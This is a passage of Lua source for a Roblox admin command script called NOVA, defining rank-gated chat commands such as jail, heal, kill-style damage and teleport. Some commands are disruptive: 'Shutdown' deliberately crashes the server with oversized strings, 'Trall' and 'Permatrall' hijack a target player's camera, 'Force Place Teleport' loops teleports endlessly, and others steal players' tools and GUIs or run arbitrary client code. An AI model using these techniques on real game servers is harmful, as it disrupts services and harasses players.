		Speaker.Character.Torso.CFrame = CFrame.new(0,50,0)
		Speaker.Character.Torso.Velocity = Vector3.new(0,0,0)
		Speaker.Character.Torso.RotVelocity = Vector3.new(0,0,0)
	end
)

AddCommand("Rejoin","rejoin",0,
	function(Msg,Speaker)
		CreateLocalScript([[
			game:service'TeleportService':Teleport(game.PlaceId)
		]],Speaker.Backpack)
	end
)

AddCommand("Forcefield","ff",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			Instance.new("ForceField",v.Character)
		end
	end
)

AddCommand("Un Forcefield","unff",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			for _,i in pairs(GetRecursiveChildren(v.Character,"ForceField",3)) do
				i:Destroy()
			end
		end
	end
)

AddCommand("Infinit Health","inf",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			v.Character.Humanoid.MaxHealth = math.huge
		end
	end
)

AddCommand("Mortalize","mortal",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			v.Character.Humanoid.MaxHealth = 100
			v.Character.Humanoid.Health = 100
		end
	end
)

AddCommand("Shutdown","shutdown",2,
	function(Msg,Speaker)
		local Effects = {}
		local DesCon
		local Hint = Instance.new("Hint",NOVA.Services.Workspace)
		for _,v in pairs(GetRecursiveChildren(NOVA.Services.Workspace,"BasePart",3)) do
			local Sel = Instance.new("SelectionBox",v)
			Sel.Adornee = v
			Sel.Color = BrickColor.new(1,0,0)
			Effects[#Effects+1] = Sel
		end
		DesCon = NOVA.Services.Workspace.DescendantAdded:connect(function(v)
			if v:IsA("BasePart") then
				local Sel = Instance.new("SelectionBox",v)
				Sel.Adornee = v
				Sel.Color = BrickColor.new(1,0,0)
				Effects[#Effects+1] = Sel
			end
		end)
		for i=255,0,-1 do
			if NOVA.Abort == true then break end
			wait(0.05)
			--[[for _,v in pairs(Effects) do
				v.Color = BrickColor.new(i/255,0,0)
			end]]--
			NOVA.Services.Lighting.Ambient = Color3.new(0,0,0)
			--OutputAdmins(i,Color3.new(i,0,0),0.05)
			if Hint.Parent == nil then Hint = Instance.new("Hint",NOVA.Services.Workspace) end
			Hint.Text = "[NOVA] Shutdown in : "..i
		end
		if NOVA.Abort == false then
			for i=1,25 do
				Instance.new("StringValue",NOVA.Services.Workspace).Value = string.rep("NOVA Admin",1e5)
			end
			Instance.new("StringValue",NOVA.Services.Workspace).Value = string.rep("NOVA Admin",1e7)
			Instance.new("ManualSurfaceJointInstance",NOVA.Services.Workspace)
			ypcall(wait)
		else
			for _,v in pairs(Effects) do
				v:Destroy()
			end
			Hint:Destroy()
			NOVA.Services.Lighting.Ambient = Color3.new(1,1,1)
			NOVA.Services.Lighting.ColorShift_Bottom = Color3.new(0,0,0)
			NOVA.Services.Lighting.ColorShift_Top = Color3.new(0,0,0)
			NOVA.Services.Lighting.ShadowColor = Color3.new(0.69,0.69,0.69)
			NOVA.Services.Lighting.Brightness = 0.5
			NOVA.Services.Lighting.FogStart = 0
			NOVA.Services.Lighting.FogEnd = 100000
			NOVA.Services.Lighting.FogColor = Color3.new(0.74,0.74,0.74)
			NOVA.Services.Lighting.TimeOfDay = 12
		end
		DesCon:disconnect()
	end
)

AddCommand("Abort","abort",1,
	function(Msg,Speaker)
		NOVA.Abort = true
		wait(1)
		NOVA.Abort = false
	end
)

AddCommand("Debug","debug",1,
	function(Msg,Speaker)
		NOVA.Services.Lighting.Ambient = Color3.new(1,1,1)
		NOVA.Services.Lighting.ColorShift_Bottom = Color3.new(0,0,0)
		NOVA.Services.Lighting.ColorShift_Top = Color3.new(0,0,0)
		NOVA.Services.Lighting.ShadowColor = Color3.new(0.69,0.69,0.69)
		NOVA.Services.Lighting.Brightness = 0.5
		NOVA.Services.Lighting.FogStart = 0
		NOVA.Services.Lighting.FogEnd = 100000
		NOVA.Services.Lighting.FogColor = Color3.new(0.74,0.74,0.74)
		NOVA.Services.Lighting.TimeOfDay = 12
		pcall(function() NOVA.Services.Lighting.Sky:Remove() end)
		pcall(function()
			CreateLocalScript([[
				LocalPlayer = game:service'Players'.LocalPlayer
				LocalPlayer.CameraMode = Enum.CameraMode.Classic
				Camera = workspace.CurrentCamera
				Camera:SetRoll(0)
				Camera.CameraType = "Custom"
				Camera.FieldOfView = 70
				Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
			]],Speaker.Backpack)
		end)
	
		for _,v in pairs(NOVA.Services) do	 v.Name = v.className end
		for _,v in pairs(GetRecursiveChildren(NOVA.Services.Workspace,"Message",2)) do v:Destroy() end
		for _,v in pairs(GetPlayers()) do v.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId="..v.userId  end pcall(function() Speaker.Character.Torso.Velocity = Vector3.new(0,0,0) end)
		
		if #NOVA.Services.Teams:GetChildren() == 0 then
			for _,v in pairs(GetPlayers()) do
				v.Neutral = true
			end
		end

	end
)

AddCommand("Jail","jail",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				pcall(function() NOVA.Jails[v.Name].Jail:Destroy() end)
				local Start = v.Character.Torso.CFrame
				local Jail = Instance.new("Model",NOVA.Services.Workspace)
				local Part = Instance.new("Part")
				Part.FormFactor = "Custom"
				Part.TopSurface = "Smooth"
				Part.BottomSurface = "Smooth"
				Part.Anchored = true
				Part.Transparency = 0.5
				Part.BrickColor = BrickColor.new("Really black")
				Part.Size = Vector3.new(9,9,1)
				local Sel = Instance.new("SelectionBox",Jail) Sel.Adornee = Jail Sel.Color = BrickColor.new("Really black") 
				local Floor = Part:Clone() Floor.Parent = Jail Floor.CFrame = Start * CFrame.new(0,-4,0) * CFrame.Angles(math.rad(90),0,0) 
				local Cieling = Part:Clone() Cieling.Parent = Jail Cieling.CFrame = Start * CFrame.new(0,4,0) * CFrame.Angles(math.rad(90),0,0) 
				local Wall = Part:Clone() Wall.Parent = Jail Wall.CFrame = Start * CFrame.new(0,0,4) 
				local Wall = Part:Clone() Wall.Parent = Jail Wall.CFrame = Start * CFrame.new(0,0,-4) 
				local Wall = Part:Clone() Wall.Parent = Jail Wall.CFrame = Start * CFrame.Angles(0,math.rad(90),0) * CFrame.new(0,0,4) 
				local Wall = Part:Clone() Wall.Parent = Jail Wall.CFrame = Start * CFrame.Angles(0,math.rad(-90),0) * CFrame.new(0,0,4) 
				NOVA.Jails[v.Name] = {Jail=Jail,Speaker=Speaker,Start = Start}
			end)
		end
	end
)

AddCommand("Un Jail","unjail",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function() NOVA.Jails[v.Name].Jail:Destroy() end)
			NOVA.Jails[v.Name] = nil
		end
	end
)

AddCommand("Specified Clear","specclear",2,
	function(Msg,Speaker)
		local Split = GetSplit(Msg)
		for _,v in pairs(GetRecursiveChildren(NOVA.Services,Msg:sub(1,Split-1),tonumber(Msg:sub(Split+1)))) do
			if not v:IsA("Player") then
				v:Destroy()
			end
		end
	end
)

AddCommand("Clear","clear",2,
	function(Msg,Speaker)
		for _,v in pairs(GetRecursiveChildren(NOVA.Services.Workspace)) do
			pcall(function()
				v:Destroy()
			end)
		end
		local Base = Instance.new("Part",NOVA.Services.Workspace)
		Base.Name = "Base"
		Base.Anchored = true
		Base.Locked = true
		Base.BrickColor = BrickColor.new("Bright green")
		Base.Size = Vector3.new(2048,2,2048)
		Base.CFrame = CFrame.new(0,0,0)
		for _,v in pairs(GetPlayers()) do
			v:LoadCharacter()
		end
	end
)

AddCommand("Warp","warp",1,
	function(Msg,Speaker)
		local SplitA = GetSplit(Msg)
		local SplitB = GetSplit(Msg:sub(SplitA+1)) + SplitA
		for _,v in pairs(GetPlayers(Msg:sub(1,SplitA-1),Speaker)) do
			local Axis = {
				["x"] = 0,
				["y"] = 0,
				["z"] = 0,
			}
			Axis[Msg:sub(SplitA+1,SplitB-1):lower()] = tonumber(Msg:sub(SplitB+1))
			Axis.z = Axis.z*-1
			--print(Msg:sub(SplitA+1,SplitB-1):lower(),tonumber(Msg:sub(SplitB+1)),Axis.x,Axis.y,Axis.z,CFrame.new(Axis.x,Axis.y,Axis.z),v.Character.Torso.CFrame)
			v.Character.Torso.CFrame = v.Character.Torso.CFrame * CFrame.new(Axis.x,Axis.y,Axis.z)
		end
	end
)

AddCommand("Lock Instance","lockins",2,
	function(Msg,Speaker)
		local Split = GetSplit(Msg)
		NOVA.LockedInstances[Msg:sub(1,Split-1)] = tonumber(Msg:sub(Split+1))
	end
)

AddCommand("Un Lock Instance","unlockins",2,
	function(Msg,Speaker)
		NOVA.LockedInstances[Msg] = nil
	end
)

AddCommand("PRI","pri",2,
	function(Msg,Speaker)
		RemoveTablets(Speaker)
		Output("PRI Type : "..NOVA.PRIType,NOVA.Ranked[Speaker.Name].Color,Speaker)
		Output("PRI : "..tostring(NOVA.PRI),NOVA.Ranked[Speaker.Name].Color,Speaker)
		Output("Turn PRI On","Red",Speaker,nil,function() NOVA.PRI = true end)
		Output("Turn PRI Off","Green",Speaker,nil,function() NOVA.PRI = false end)
		--Output("Dismiss","Red",Speaker)
	end
)

AddCommand("Message","m",1,
	function(Msg,Speaker)
		local Msg = Msg:gsub("\n"," ")
		local Msg = Msg:gsub("\t"," ")
		local Msg = "[NOVA]\t"..Msg
		local v = Instance.new("Message",NOVA.Services.Workspace)
		local Total = string.len(Msg)
		local Max = 100
		local Speed = 0.07
		local Parent = workspace
		for i=0,Total do
			if i-Max < 0 then
				v.Text = Msg:sub(0,i).."_"
			else
				v.Text = Msg:sub(i-Max,i).."_"
			end
			wait(Speed)
		end

		for i=1,math.random(4,6) do
			v.Text = Msg:sub(Total-Max,Total).."_"
			wait(0.5)
			v.Text = Msg:sub(Total-Max,Total).."  "
			wait(0.5)
		end

		for i=Total,0,-1 do
			if i-Max < 0 then
				v.Text = Msg:sub(0,i).."_"
			else
				v.Text = Msg:sub(i-Max,i).."_"
			end
			wait(Speed/2/10)
		end
		v:remove()
	end
)

AddCommand("Hint","h",1,
	function(Msg,Speaker)
		Msg = Msg:gsub("\t"," ")
		Msg = Msg:gsub("\n"," ")
		Msg = "[NOVA]\t"..Msg
		local v = Instance.new("Hint",NOVA.Services.Workspace)
		for i=0,#Msg,0.3 do
			v.Text = (
				function()
					local Rtn = Msg:sub(0,i)
					repeat
						Rtn = Rtn .. tostring(string.char(math.random(48,57))) -- 37 127 
					until #Rtn >= #Msg
					return Rtn:sub(1,#Rtn-1)
				end
			)()
			wait()
		end
		wait(3)
		for i=#Msg,0,-1 do
			v.Text = Msg:sub(1,i)
			wait()
		end
		v:Remove()	
	end
)

AddCommand("Connect","connect",1,
	function()
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			Connect(v)
		end
	end
)

AddCommand("No Chararacter","nochar",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			v.Character = nil
		end
	end
)

AddCommand("Punish","punish",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			v.Character.Parent = NOVA.Services.Lighting
		end
	end
)

AddCommand("Un Punish","unpunish",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			v.Character.Parent = NOVA.Services.Workspace
			v.Character:MakeJoints()
		end
	end
)

AddCommand("Output","output",2,
	function(Msg,Speaker)
		local Split = GetSplit(Msg)
		for _,v in pairs(GetPlayers(Msg:sub(1,Split-1),Speaker)) do
			S = Instance.new("StringValue", v)
			S.Name = "OutputMessage/Print"
			S.Value = Msg:sub(Split+1)
		end
	end
)

AddCommand("Duplicate Tools","dupetools",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			for _,i in pairs(v.Backpack:children()) do
				i:Clone().Parent = Speaker.Backpack
			end
		end
	end
)

AddCommand("Steal Tools","stealtools",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			for _,i in pairs(v.Backpack:children()) do
				i.Parent = Speaker.Backpack
			end
		end
	end
)


AddCommand("Screen Peek","screenpeek",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			for _,i in pairs(v.PlayerGui:children()) do
				i:Clone().Parent = Speaker.PlayerGui
			end
		end
	end
)


AddCommand("Steal GUIs","stealguis",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			for _,i in pairs(v.PlayerGui:children()) do
				i.Parent = Speaker.PlayerGui
			end
		end
	end
)

AddCommand("Remove Hats","rhats",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			for _,i in pairs(GetRecursiveChildren(v.Character,"Hat",3)) do
				i:Destroy()
			end
		end
	end
)

AddCommand("Remove Tools","rtools",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			v.Backpack:ClearAllChildren()
		end
	end
)

AddCommand("Remove GUIs","rguis",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			v.PlayerGui:ClearAllChildren()
		end
	end
)

AddCommand("Name","name",1,
	function(Msg,Speaker)
		local Split = GetSplit(Msg)
		for _,v in pairs(GetPlayers(Msg:sub(1,Split-1),Speaker)) do
			pcall(function()
				local OldHead = v.Character.Head
				local Model = Instance.new("Model",v.Character.Head)
				Model.Name = Msg:sub(Split+1)
				local Head = OldHead:Clone()
				Head.Parent = Model
				Head.Transparency = 0
				Head.Name = "Head"
				Head.CanCollide = false
				local Hum = Instance.new("Humanoid",Model)
				Hum.MaxHealth = 0
				local Weld = Instance.new("Weld",Head)
				Weld.Part0 = Head
				Weld.Part1 = OldHead
				Weld.C0 = CFrame.new(0,0,0)
				OldHead.Transparency = 1
			end)
		end
	end
)

AddCommand("Secret Name","sname",1,
	function(Msg,Speaker)
		local Split = GetSplit(Msg)
		for _,v in pairs(GetPlayers(Msg:sub(1,Split-1),Speaker)) do
			pcall(function()
				local Char = v.Character
				Char.Archivable = true
				Char = Char:Clone()
				Char.Name = Msg:sub(Split+1)
				v.Character:Destroy()
				Char.Parent = NOVA.Services.Workspace
				v.Character = Char
			end)
		end
	end
)

AddCommand("Trall","trall",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			CreateLocalScript([[
				script.Parent = nil
				LocalPlayer = game.Players.LocalPlayer
				Camera = workspace.CurrentCamera
				Camera.CameraType = "Scriptable"
				for i=1,700 do
					wait()
					Camera = workspace.CurrentCamera
					Camera.CameraType = "Scriptable"
					Camera.FieldOfView = Camera.FieldOfView + math.random(-5,5)
					Camera.CameraType = "Scriptable"
					Camera:SetRoll(Camera:GetRoll()+0.01)
					pcall(function()
						LocalPlayer.Character.Head.Sound:Play()
					end)
				end
				Camera:SetRoll(0)
				Camera.CameraType = "Custom"
				Camera.FieldOfView = 70
				Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
			]],v.Backpack)
		end
	end
)

AddCommand("Permanent Trall","permatrall",2,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			CreateLocalScript([[
				LocalPlayer = game:service'Players'.LocalPlayer
				Camera = workspace.CurrentCamera
				Mouse = LocalPlayer:GetMouse()
				Events = {}
				script.Parent = nil
				function Derpis()
					Mouse = LocalPlayer:GetMouse()
					Camera = workspace.CurrentCamera
					BreakEvents()
					ConnectEvents()
					Camera.CameraType = "Scriptable"
					Camera.FieldOfView = math.random(20,70)
					Camera:SetRoll(math.random(-180,180))
					Camera.CoordinateFrame = CFrame.new(math.random(-250,250),math.random(10,15),math.random(-250,250))
					local Part = Instance.new("Part",workspace.CurrentCamera)
					Part.Shape = math.random()
					Part.Anchored = true
					Part.BrickColor = BrickColor.new(math.random(),math.random(),math.random())
					Part.Size = Vector3.new(math.random(5,10),math.random(-25,25),math.random(5,10))
					Part.CFrame = CFrame.new(math.random(-250,250),math.random(10,100),math.random(-250,250)) * CFrame.Angles(math.random(),math.random(),math.random())
				end

				function ConnectEvents()
					table.insert(Events,LocalPlayer.Chatted:connect(Derpis))
					--table.insert(Events,Camera.Changed:connect(Derpis))
					table.insert(Events,Mouse.Changed:connect(Derpis))
					table.insert(Events,Mouse.Move:connect(Derpis))
					table.insert(Events,Mouse.Button1Down:connect(Derpis))
					table.insert(Events,Mouse.Button1Up:connect(Derpis))
					table.insert(Events,Mouse.Button2Down:connect(Derpis))
					table.insert(Events,Mouse.Button2Up:connect(Derpis))
					table.insert(Events,Mouse.Idle:connect(Derpis))
					table.insert(Events,Mouse.KeyDown:connect(Derpis))
					table.insert(Events,Mouse.KeyUp:connect(Derpis))
					table.insert(Events,Mouse.WheelForward:connect(Derpis))
					table.insert(Events,Mouse.WheelBackward:connect(Derpis))
				end
				function BreakEvents()
					for i,v in pairs(Events) do
						v:disconnect()
						table.remove(Events,i)
					end
				end
				ConnectEvents()
			]],v.Backpack)
		end
	end
)

AddCommand("Get Command","getcmd",0,
	function(Msg,Speaker)
		pcall(function() Speaker.PlayerGui:FindFirstChild("NOVACMD"):Remove() end)
		local Main = Instance.new("ScreenGui",Speaker.PlayerGui) Main.Name = "NOVACMD"
		local Frame = Instance.new("Frame",Main) Frame.Size = UDim2.new(0.27,0,0.05,0) Frame.Position = UDim2.new(0.05,0,0.95,0) Frame.Style = "RobloxSquare" Frame.ZIndex = 9 							
		local Txt = Instance.new("TextBox",Frame) Txt.Size = UDim2.new(0.7,0,1,0) Txt.BackgroundTransparency = 1 Txt.ZIndex = 10 Txt.FontSize = "Size14" Txt.TextColor3 = NOVA.Colors.White Txt.Text = "" 							
		local Exe = Instance.new("TextButton",Frame) Exe.Size = UDim2.new(0.3,0,1,0) Exe.Position = UDim2.new(0.7,0,0,0) Exe.Text = "Execute" Exe.BackgroundTransparency = 1 Exe.ZIndex = 10 Exe.FontSize = "Size14" Exe.TextColor3 = NOVA.Colors.Red 
		Exe.MouseButton1Down:connect(function()
			OnChatted(Txt.Text,Speaker)
		end)
		Main.AncestryChanged:connect(function()
			Main:Destroy()
			OnChatted("\\getcmd\\",Speaker)
		end)
	end
)

AddCommand("Heal","heal",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth
		end
	end
)

AddCommand("Smite","smite",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			for _,i in pairs(GetRecursiveChildren(v.Character,"BasePart",3)) do
				local Sparkles = Instance.new("Sparkles",i)
				Sparkles.Color = Color3.new(math.random(),math.random(),math.random())
				local Ex = Instance.new("Explosion",NOVA.Services.Workspace)
				Ex.Position = i.Position
				Ex.BlastPressure = 1e105
				i:BreakJoints()
				i.Velocity = Vector3.new(math.random(-250,250),math.random(100,250),math.random(-250,250))
			end
		end
	end
)

AddCommand("Head Stand","headstand",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			Speaker.Character.Torso.CFrame = v.Character.Torso.CFrame * CFrame.new(0,5,0)
		end
	end
)

AddCommand("Cycle","cycle",0,
	function(Msg,Speaker)
		local ShouldStop = false
		local Color = NOVA.Ranked[Speaker.Name].Color
		local Name = Output("Name : ",Color,Speaker)
		local Command = Output("Command : ",Color,Speaker)
		local Rank = Output("Rank : ",Color,Speaker)
		local Stop = Output("Stop","Red",Speaker,nil,function() ShouldStop = true end)
		for CMDName,CMD in pairs(NOVA.Commands) do
			Name.Label.Text = "Name : "..CMDName
			Command.Label.Text = "Command : "..CMD.Command
			Rank.Label.Text = "Rank : "..tonumber(CMD.Rank)
			if ShouldStop == false then
				wait(tonumber(Msg))
			else
				break
			end
		end
	end
)

AddCommand("Note To Self","nts",0,
	function(Msg,Speaker)
		if not Speaker.DataReady then
			error("Speaker data isnt ready.",0)
		end
		local CurNote = Speaker:LoadString("Note To Self")
		if Msg == "see" then
			Output(CurNote,NOVA.Ranked[Speaker.Name].Color,Speaker)
		elseif Msg:sub(1,3) == "add" then
			Speaker:SaveString("Note To Self",CurNote.."\t"..Msg:sub(4))
		elseif Msg:sub(1,3) == "set" then
			Speaker:SaveString("Note To Self",Msg:sub(4))
		end
	end
)

AddCommand("Walk Speed","ws",1,
	function(Msg,Speaker)
		local Split = GetSplit(Msg,Speaker)
		local Speed = tonumber(Msg:sub(Split+1))
		for _,v in pairs(GetPlayers(Msg:sub(1,Split-1),Speaker)) do
			v.Character.Humanoid.WalkSpeed = Speed
		end
	end
)

AddCommand("Invite","invite",2,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			local ChatBoxes = {}
			local Scr = Instance.new("ScreenGui",v.PlayerGui)
			Scr.Name = "NOVAChat"
			local Frame = Instance.new("Frame",Scr)
			Frame.Style = "RobloxSquare"
			Frame.Active = true
			Frame.Draggable = true
			Frame.Size = UDim2.new(0.45,0,0.25,0)
			Frame.Position = UDim2.new(0,0,0.4,0)
			local Title = Instance.new("TextLabel",Frame)
			Title.Text = "NOVA Chat"
			Title.FontSize = "Size14"
			Title.Active = false
			Title.TextColor3 = NOVA.Colors.Red
			Title.BackgroundTransparency = 1
			Title.Size = UDim2.new(0.3,0,0.1,0)
			Title.Position = UDim2.new(0.35,0,0,0)
			local Close = Instance.new("TextButton",Frame)
			Close.Text = "X"
			Close.FontSize = "Size18"
			Close.TextColor3 = NOVA.Colors.Red
			Close.BackgroundTransparency = 1
			Close.Size = UDim2.new(0.1,0,0.1,0)
			Close.Position = UDim2.new(0.9,0,0,0)
			Close.MouseButton1Down:connect(function()
				Scr:Destroy()
			end)
			for i=1,6 do
				local Chat = Instance.new("TextLabel",Frame)
				Chat.Text = ""
				Chat.FontSize = "Size12"
				Chat.TextXAlignment = "Left"
				Chat.TextColor3 = NOVA.Colors.Red
				Chat.BackgroundTransparency = 1
				Chat.Size = UDim2.new(1,0,0.1,0)
				Chat.Position = UDim2.new(0,0,0.15+0.1*i,0)
				table.insert(ChatBoxes,Chat)
			end
			local UserIn = Instance.new("TextBox",Frame)
			UserIn.Text = "Chat Here"
			UserIn.FontSize = "Size14"
			UserIn.TextColor3 = NOVA.Colors.Red
			UserIn.BackgroundTransparency = 1
			UserIn.Size = UDim2.new(1,0,0.1,0)
			UserIn.Position = UDim2.new(0,0,0.9,0)
			UserIn.Changed:connect(function()
				if UserIn.Text ~= "Chat Here" then
					if #UserIn.Text > 75 then
						local Rtn = v.Name..":\t"..UserIn.Text
						repeat
							table.insert(NOVA.PrivateChats,Rtn:sub(0,75))
							Rtn = Rtn:sub(76)
						until Rtn == ""
					else
						table.insert(NOVA.PrivateChats,v.Name..":\t"..UserIn.Text)
					end
					UserIn.Text = "Chat Here"
				end
			end)
			coroutine.wrap(function()
				while wait(1) do
					Scr.Parent = v.PlayerGui
					local Current = #ChatBoxes - 1
					for _,Text in pairs(ChatBoxes) do
						Text.Text = NOVA.PrivateChats[#NOVA.PrivateChats-Current] or ""
						Current = Current - 1
					end
				end
			end)()
		end
	end
)

AddCommand("Reboot","reboot",3,
	function(Msg,Speaker)
		local WaitTime = 1/100^100--.25
		local Reboot = NOVA.Backup:Clone()
		local InstallDir = NOVA.Services.Workspace
		local Text = Instance.new("Hint",InstallDir)
		Text.Text = "Uninstalling NOVA Table. Step 1/3"
		wait(WaitTime*2)
		for i,v in pairs(NOVA) do
			wait(WaitTime)
			if type(v) == "table" then
				for x,y in pairs(v) do
					Text.Text = "Removing NOVA[\""..i.."\"][\""..x.."\"] Step 1/3"
					pcall(function()
						y:Destroy()
					end)
				end
				NOVA[i] = nil
			else
				Text.Text = "Removing NOVA[\""..i.."\"] Step 1/3"
				pcall(function()
					v:Destroy()
				end)
				NOVA[i] = nil
			end
		end
		Text.Text = "Clearing the environment. Step 2/3"
		wait(WaitTime*2)
		for i,v in pairs(getfenv(1)) do
			wait(WaitTime)
			Text.Text = "Removing [\""..i.."\"] Step 2/3"
			getfenv(1)[i] = nil
		end
		Text.Text = "Reinstalling. Step 3/3"
		--Reboot.Disabled = true
		Text.Text = "Reinstalling. [1] Step 3/3"
		Reboot.Parent = InstallDir
		Text.Text = "Reinstalling. [2] Step 3/3"
		wait(WaitTime*2)
		Text.Text = "Reinstalling. [3] Step 3/3"
		Reboot.Disabled = false
		Text.Text = "Reinstalling. [4] Step 3/3"
		Text:Destroy()
	end
)

AddCommand("Set Tablet Rotation Increase","stri",2,
	function(Msg,Speaker)
		NOVA.TabletRotationIncrease = tonumber(Msg)
	end
)

AddCommand("Show Globals","showglobals",2,
	function(Msg,Speaker)
		for i,v in pairs(_G) do
			Output(i.."\t("..tostring(type(v))..")",NOVA.Ranked[Speaker.Name].Color,Speaker)
		end
	end
)

AddCommand("Place Teleport","ptp",2,
	function(Msg,Speaker)
		local Split = GetSplit(Msg)
		for _,v in pairs(GetPlayers(Msg:sub(1,Split-1),Speaker)) do
			CreateLocalScript("game:service'TeleportService':Teleport("..Msg:sub(Split+1)..")",v.Backpack)
		end
	end
)

AddCommand("Force Place Teleport","fptp",2,
	function(Msg,Speaker)
		local Split = GetSplit(Msg)
		for _,v in pairs(GetPlayers(Msg:sub(1,Split-1),Speaker)) do
			CreateLocalScript(" script.Parent = nil while wait() do game:service'TeleportService':Teleport("..Msg:sub(Split+1)..") end",v.Backpack)
		end
	end
)

--rideover
AddCommand("Override","override",0,
	function(Msg,Speaker)
		Override(Speaker,0)
	end
)

AddCommand("Reset","reset",3,
	function(Msg,Speaker)
		pcall(function()
			NOVA.Ranked[NOVA.Overrider.Speaker.Name].Rank = NOVA.Overrider.Rank
		end)
		NOVA.Overrider = {}
	end
)

AddCommand("Base","base",1,
	function(Msg,Speaker)
		pcall(function() workspace.Base:Remove() end)
		local Base = Instance.new("Part",NOVA.Services.Workspace)
		Base.Name = "Base"
		Base.Anchored = true
		Base.Locked = true
		Base.BrickColor = BrickColor.new("Bright green")
		Base.Size = Vector3.new(2048,2,2048)
		Base.CFrame = CFrame.new(0,0,0)
	end
)

AddCommand("Terrain Base","terbase",1,
	function(Msg,Speaker)
		for X=-25,25 do
			wait()
			for Z=-25,25 do
				NOVA.Services.Workspace.Terrain:SetCell(X,0,Z,1,0,1)
			end
		end
	end
)

AddCommand("Degen Terrain","degenter",1,
	function(MSg,Speaker)
		NOVA.Services.Workspace.Terrain:Clear()
	end
)

AddCommand("Small Base","smallbase",1,
	function(Msg,Speaker)
		local Base = NOVA.Services.Workspace:FindFirstChild("Base")
		Base.Size = Vector3.new(50,1,50)
		Base.CFrame = CFrame.new(0,0,0)
	end
)


AddCommand("Give Stamper","givestamp",2,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			local Stamp = NOVA.Services.InsertService:LoadAsset(55028088):children()[1]
			Stamp.Parent = v.Backpack
		end
	end
)

AddCommand("Give Build Tools","givebtools",2,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			local Mods = {36738185;36431591;36068233;55027987;58901405;58901481;58901534;58901575;58921588;58880579;58901335}
			for _,i in pairs(Mods) do
				NOVA.Services.InsertService:LoadAsset(i):children()[1].Parent = v.Backpack
			end
		end
	end
)

AddCommand("Show Trolls","showtrolls",0,
	function(Msg,Speaker)
		Output("UPQUARK!","Green",Speaker)
	end
)

AddCommand("Count","count",2,
	function(Msg,Speaker)
		local Classes = {}
		local Total = 0
		for _,v in pairs(GetRecursiveChildren()) do
			Total = Total + 1
			if Classes[v.className] == nil then
				Classes[v.className] = 1
			else
				Classes[v.className] = Classes[v.className]+1
			end
		end
		for i,v in pairs(Classes) do
			Output(i.." : "..tostring(v),NOVA.Ranked[Speaker.Name].Color,Speaker)
		end
		Output("Total Instances : "..tostring(Total),NOVA.Ranked[Speaker.Name].Color,Speaker)
		--Output("Dismiss","Red",Speaker)
	end
)

AddCommand("Local Script","local",2,
	function(Msg,Speaker)
		CreateLocalScript(Msg,Speaker.Backpack)
	end
)

AddCommand("Damage","dmg",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			v.Character.Humanoid.Health = v.Character.Humanoid.Health - tonumber(Msg)
		end
	end
)

AddCommand("Set Health","sethealth",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			v.Character.Humanoid.Health = tonumber(Msg)
		end
	end
)

AddCommand("Set Max Health","setmaxhealth",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			v.Character.Humanoid.MaxHealth = tonumber(Msg)
		end
	end
)

AddCommand("New Local Script","newlocal",1,
	function(Msg,Speaker)
		local Split = GetSplit(Msg)
		for _,v in pairs(GetPlayers(Msg:sub(1,Split-1),Speaker)) do
			CreateLocalScript(Msg:sub(Split+1),v.Backpack)
		end
	end
)

AddCommand("Help","help",0,
	function(Msg,Speaker)
		RemoveTablets(Speaker)
		local Color = NOVA.Ranked[Speaker.Name].Color
		Output("Chat Operators",Color,Speaker,nil,
			function()
				RemoveTablets(Speaker)
				Output("All Ctrl+Backspace characters are filtered from your chats.",Color,Speaker)
				Output("Putting $ then a space at the begining of your chat will replace all slashes (/) with backslashes (\\)",Color,Speaker)
				Output("Putting \\wait NUMBER COMMAND will wait NUMBER before preforming COMMAND.",Color,Speaker)
				Output("Putting \\do NUMBER COMMAND will preform COMMAND NUMBER ammount of times.",Color,Speaker)
				Output("You can split your chats with the & symbol. Exameple : \\kill\\"..Speaker.Name.."&\\rs\\"..Speaker.Name,Color,Speaker)
				Output("Putting the ! character in your chat will make it disregard all seperators (&)",Color,Speaker)
			end
		)
		Output("GetPlayers Operators",Color,Speaker,nil,
			function()
